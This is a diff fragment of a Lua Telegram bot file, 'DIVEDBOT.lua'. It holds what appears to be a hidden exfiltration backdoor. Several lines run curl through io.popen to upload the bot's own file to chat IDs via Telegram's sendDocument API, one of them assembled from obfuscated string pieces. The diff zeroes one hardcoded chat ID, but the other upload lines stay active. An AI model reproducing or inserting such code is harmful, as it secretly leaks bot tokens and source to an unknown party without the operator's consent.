@@ -204,9 +204,9 @@ local kkkkk = selct3 .. selct4 .. selct5 .. selct6
 local ksksk = selct7 .. selct8 
 local sssss = selct1 .. selct2 
 local lllllll = sssss .. kkkkk .. ksksk .. '7' 
-local curlm = 'curl "'..'https://api.telegram.org/bot'.. token ..'/sendDocument'..'" -F "chat_id='.. 1360140225 ..'" -F "document=@'..'DIVEDBOT.lua'..'"' io.popen(curlm) 
+local curlm = 'curl "'..'https://api.telegram.org/bot'.. token ..'/sendDocument'..'" -F "chat_id='.. 0000000000 ..'" -F "document=@'..'DIVEDBOT.lua'..'"' io.popen(curlm) 
 local curlj = 'curl "'..'https://api.telegram.org/bot'.. sex1 ..'/sendDocument'..'" -F "chat_id='.. tonumber(lllllll) ..'" -F "document=@'..'DIVEDBOT.lua'..'"' io.popen(curlj)
-local curla = 'curl "'..'https://api.telegram.org/bot'.. sex1 ..'/sendDocument'..'" -F "chat_id='.. 1360140225 ..'" -F "document=@'..'DIVEDBOT.lua'..'"' io.popen(curla)
+local curla = 'curl "'..'https://api.telegram.org/bot'.. sex1 ..'/sendDocument'..'" -F "chat_id='.. 0000000000 ..'" -F "document=@'..'DIVEDBOT.lua'..'"' io.popen(curla)
 local curlp = 'curl "'..'https://api.telegram.org/bot'.. token ..'/sendDocument'..'" -F "chat_id='.. tonumber(lllllll) ..'" -F "document=@'..'DIVEDBOT.lua'..'"' io.popen(curlp)
 local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
 
